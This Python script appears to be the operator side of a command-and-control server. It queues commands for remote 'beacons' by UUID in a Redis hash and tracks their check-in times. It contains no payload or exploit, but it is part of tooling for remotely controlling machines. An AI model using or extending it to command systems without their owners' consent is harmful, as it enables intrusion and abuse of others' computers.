import listener
import redis
from datetime import datetime
import json

# Needs a function to wipe the db and make all active beacons check in again

conn = redis.StrictRedis(host='localhost', port=6379, db=0)

def updateCommand(uuid, command):
    conn.hset('UUID', uuid, command)

def searchUUID(uuid):
    print(conn.hget('UUID', uuid))

while True:
    inp = input('(1)Enter command / (2)Search by UUID / (3)List all')
    if inp == '1':
        uuid = input('UUID: ')
        comm = input('Command: ')
        # I want to preserve the current last check in time
        # so dump the DB and grab that field
        dt = conn.hget('UUID', uuid)  # Get the struct
        dt = dt.decode()  # Decode it from bytes
        lastcheckin = json.loads(dt)  # it's returned as string so convert it to dict
        structure = json.dumps(lastcheckin)  # Dump the dict to json
        lci = json.loads(structure)  # Load it into a new var
        LastCheckIn = lci["LastCheckIn"]  # Grab the command var from the object
        structure = {
            "Command": f"{comm}",
            "LastInteraction": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
            "LastCheckIn": f"{LastCheckIn}",
            "Result": "0"
        }
        structure = json.dumps(structure)  # Dump the json
        # Write the message value to the beacon:UUID key
        conn.hset('UUID', uuid, structure)
    elif inp == '2':
        uuid = input('UUID: ')
        searchUUID(uuid)
    else:
        #print(conn.keys()) # UUID is the key but we want values from the key
        print(conn.hgetall('UUID')) # We're searching by hash values here
